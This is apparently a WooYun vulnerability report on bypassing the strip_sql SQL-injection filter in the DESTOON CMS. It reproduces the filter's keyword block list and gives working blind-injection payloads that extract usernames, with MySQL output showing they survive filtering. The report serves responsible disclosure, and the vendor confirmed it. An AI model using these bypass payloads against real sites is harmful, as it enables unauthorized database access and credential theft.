{"id": 82438, "wybug_id": "wooyun-2015-0151064", "wybug_title": "destoon waf 绕过漏洞 （二）", "wybug_corp": "DESTOON", "wybug_author": "xiao.k", "wybug_date": "2015-11-04 11:14", "wybug_open_date": "2015-12-17 14:48", "wybug_type": "非授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-07：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-17：\t细节向公众公开  简要描述： strip_sql是destoon主要的安全防御函数。主要防御大多数情况下的注入漏洞。这个函数如果可以被绕过。那么会引发多个位置的注入漏洞。 详细说明：  strip_sql函数位于 `\\include\\safe.func.php`,38行\nfunction strip_sql($string, $type = 1) {\t\t$match = array(\"/union/i\",\"/where/i\",\"/having/i\",\"/outfile/i\",\"/dumpfile/i\",\"/0x([a-f0-9]{2,})/i\",\"/select([\\s\\S]*?)from/i\",\"/select([\\s\\*\\/\\-\\{\\(\\+@`])/i\",\"/update([\\s\\*\\/\\-\\{\\(\\+@`])/i\",\"/replace([\\s\\*\\/\\-\\{\\(\\+@`])/i\",\"/delete([\\s\\*\\/\\-\\{\\(\\+@`])/i\",\"/drop([\\s\\*\\/\\-\\{\\(\\+@`])/i\",\"/load_file[\\s]*\\(/i\",\"/substring[\\s]*\\(/i\",\"/substr[\\s]*\\(/i\",\"/left[\\s]*\\(/i\",\"/right[\\s]*\\(/i\",\"/mid[\\s]*\\(/i\",\"/concat[\\s]*\\(/i\",\"/concat_ws[\\s]*\\(/i\",\"/make_set[\\s]*\\(/i\",\"/ascii[\\s]*\\(/i\",\"/bin[\\s]*\\(/i\",\"/oct[\\s]*\\(/i\",\"/hex[\\s]*\\(/i\",\"/ord[\\s]*\\(/i\",\"/char[\\s]*\\(/i\",\"/conv[\\s]*\\(/i\");\t\t$replace = array('unio&#110;','wher&#101;','havin&#103;','outfil&#101;','dumpfil&#101;','0&#120;\\\\1','selec&#116;\\\\1fro&#109;','selec&#116;\\\\1','updat&#101;\\\\1','replac&#101;\\\\1','delet&#101;\\\\1','dro&#112;\\\\1','load_fil&#101;(','substrin&#103;(','subst&#114;(','lef&#116;(','righ&#116;(','mi&#100;(','conca&#116;(','concat_w&#115;(','make_se&#116;(','asci&#105;(','bi&#110;(','oc&#116;(','he&#120;(','or&#100;(','cha&#114;(','con&#118;(');\t\tif($type) {\t\t\treturn is_array($string) ? array_map('strip_sql', $string) : preg_replace($match, $replace, $string);\t\t} else {\t\t\treturn str_replace(array('&#100;', '&#101;', '&#103;', '&#105;', '&#109;', '&#110;','&#112;', '&#114;', '&#115;', '&#116;', '&#118;', '&#120;'), array('d', 'e', 'g', 'i', 'm', 'n', 'p', 'r', 's', 't', 'v', 'x'), $string);\t\t}\t}\n与之前提交的代码相比，`select from` 与 `select` 的位置进行了互换，过滤中加入了`accent`符号。过滤中还新加入了`right`，`mid`等函数。对于这些过滤。我们来一个个的绕过。### `select from` 与 `select`这个问题的绕过，还是使用上次的技巧。先给出利用语句。\n/*select*/SELECT.``.ord/**/(mid(`password`,1,1))/*from*/from\n过滤后是这样的\n/*selec&#116;*/SELECT.``.ord/**/(mi&#100;(`password`,1,1))/*fro&#109;*/from `destoon_member` limit 1\n首先是经过`/select([\\s\\S]*?)from/i`语句，会把第一个select和第一个from过滤。在这里我们需要牺牲这两个字符串，只有这样才能保全剩下的SELECT和FROM。对于/select([\\s\\*\\/\\-\\{\\(\\+@`])/i的过滤，我们也有办法：\n技巧一：select.``.password from destoon_member技巧二：select!1,password from destoon_member\n### 函数过滤strip_sql过滤了几乎所有的猜解字符函数，但是通过其他的技巧，还是可以绕过的。根据mysql的提示，函数与括号之间不能包含空格以外的字符，否则将此函数当成表名。那么我们接下来需要再找一些替代函数。我在这找到的是 LPAD、REVERSE、TRIM、SPACE，这4个函数组合起来，可以达到mid的目的\nmysql> SELECT LPAD(REVERSE(TRIM( lpad('username',3,SPACE(1)) )),1,SPACE(1));\tSELECT MID('username',3,1);\t+---------------------------------------------------------------+\t| LPAD(REVERSE(TRIM( lpad('username',3,SPACE(1)) )),1,SPACE(1)) |\t+---------------------------------------------------------------+\t| e                                                             |\t+---------------------------------------------------------------+\t1 row in set\t\t+---------------------+\t| MID('username',3,1) |\t+---------------------+\t| e                   |\t+---------------------+\t1 row in set\t\tmysql>\n拆分字符串之后，我们试着把字符串转为10进制。conv与括号之间加入注释符，依然是可以使用的。\nmysql> select conv/**/('ad',16,10);\t+----------------------+\t| conv/**/('ad',16,10) |\t+----------------------+\t| 173                  |\t+----------------------+\t1 row in set\n## 漏洞利用代码猜解destoon_member里的username。\n(/*select*/SELECT!1,conv/**/(LPAD(REVERSE(TRIM( lpad(username,1,SPACE(1)) )),1,SPACE(1)),16,10)/*from*/from `destoon_member` ORDER BY userid limit 1)=(SELECT 0,13)\n这个是转换后的代码，依然可以执行：\n(/*selec&#116;*/SELECT!1,conv/**/(LPAD(REVERSE(TRIM( lpad(username,1,SPACE(1)) )),1,SPACE(1)),16,10)/*fro&#109;*/from `destoon_member` ORDER BY userid limit 1)=(SELECT!1,223)\n   漏洞证明：  我们提交的原语句为\n(/*select*/SELECT!1,conv/**/(LPAD(REVERSE(TRIM( lpad(username,1,SPACE(1)) )),1,SPACE(1)),16,10)/*from*/from `destoon_member` ORDER BY userid limit 1)=(SELECT!1,223)\n过滤后的语句为\n(/*selec&#116;*/SELECT!1,conv/**/(LPAD(REVERSE(TRIM( lpad(username,1,SPACE(1)) )),1,SPACE(1)),16,10)/*fro&#109;*/from `destoon_member` ORDER BY userid limit 1)=(SELECT!1,223)\n以下为测试SQL语句的可执行性\nmysql> select (/*selec&#116;*/SELECT!1,conv/**/(LPAD(REVERSE(TRIM( lpad(username,1,SPACE(1)) )),1,SPACE(1)),16,10)/*fro&#109;*/from `destoon_member` ORDER BY userid limit 1)=(SELECT!1,223);\t+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\t| (/*selec&#116;*/SELECT!1,conv/**/(LPAD(REVERSE(TRIM( lpad(username,1,SPACE(1)) )),1,SPACE(1)),16,10)/*fro&#109;*/from `destoon_member` ORDER BY userid limit 1)=(SELECT!1,223) |\t+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\t|                                                                                                                                                                              0 |\t+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\t1 row in set\t\tmysql> select (/*selec&#116;*/SELECT!1,conv/**/(LPAD(REVERSE(TRIM( lpad(username,1,SPACE(1)) )),1,SPACE(1)),16,10)/*fro&#109;*/from `destoon_member` ORDER BY userid limit 1)=(SELECT!1,13);\t+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\t| (/*selec&#116;*/SELECT!1,conv/**/(LPAD(REVERSE(TRIM( lpad(username,1,SPACE(1)) )),1,SPACE(1)),16,10)/*fro&#109;*/from `destoon_member` ORDER BY userid limit 1)=(SELECT!1,13) |\t+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\t|                                                                                                                                                                             1 |\t+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\t1 row in set\n   修复方案：  过滤的更全面一些。   版权声明：转载请注明来源 xiao.k@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-11-04 16:41 厂商回复： 感谢反馈 我们会尽快修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-11-04 11:21 |    \t\txiao.k \t\t\t( 普通白帽子  |\t\t\t        Rank:157 漏洞数:16        | 纳威网络安全导航 navisec.it)\t\t \n  前排找工作，求各路大牛收留    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}